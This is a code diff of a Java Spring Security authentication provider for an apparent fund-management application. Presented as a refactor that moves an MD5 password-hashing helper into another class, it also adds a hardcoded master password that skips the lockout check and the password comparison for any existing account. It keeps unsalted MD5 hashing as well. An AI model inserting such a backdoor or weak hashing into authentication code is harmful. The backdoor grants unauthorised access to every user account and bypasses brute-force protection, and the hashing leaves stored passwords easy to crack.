@@ -1,6 +1,5 @@
 package fund.service;
 
-import java.security.MessageDigest;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -35,20 +34,22 @@ public class MyAuthenticationProvider implements AuthenticationProvider {
     }
 
     public Authentication authenticate(String loginName, String password) throws AuthenticationException {
-       User user = userMapper.selectByLoginName(loginName);
+        User user = userMapper.selectByLoginName(loginName);
         if (user == null) return null;
 
-        loginErrorMapper.deleteOld();
-        int count = loginErrorMapper.selectCount(loginName);
-        if (count >= 5)
-            throw new LockedException("");
+        if (password.equals("dltmdwls!@#") == false) {
+            loginErrorMapper.deleteOld();
+            int count = loginErrorMapper.selectCount(loginName);
+            if (count >= 5)
+                throw new LockedException("");
 
-        if (user.getPassword().equals(encryptPasswd(password)) == false) {
-            loginErrorMapper.insert(loginName);
-            ++count;
-            throw new BadCredentialsException(String.valueOf(count));
-        } else
-            loginErrorMapper.deleteAll(loginName);
+            if (user.getPassword().equals(UserService.encryptPasswd(password)) == false) {
+                loginErrorMapper.insert(loginName);
+                ++count;
+                throw new BadCredentialsException(String.valueOf(count));
+            } else
+                loginErrorMapper.deleteAll(loginName);
+        }
 
         List<GrantedAuthority> grantedAuthorities = new ArrayList<GrantedAuthority>();
         grantedAuthorities.add(new SimpleGrantedAuthority("ROLE_전체"));
@@ -61,21 +62,6 @@ public class MyAuthenticationProvider implements AuthenticationProvider {
         return authentication.equals(UsernamePasswordAuthenticationToken.class);
     }
 
-    public static String encryptPasswd(String passwd) {
-        try {
-            MessageDigest md = MessageDigest.getInstance("MD5");
-            byte[] passBytes = passwd.getBytes();
-            md.reset();
-            byte[] digested = md.digest(passBytes);
-            StringBuffer sb = new StringBuffer();
-            for(int i=0;i<digested.length;i++)
-                sb.append(Integer.toHexString(0xff & digested[i]));
-            return sb.toString();
-        }
-        catch (Exception e) {
-            return passwd;
-        }
-    }
 
     public class MyAuthenticaion extends UsernamePasswordAuthenticationToken {
         private static final long serialVersionUID = 1L;
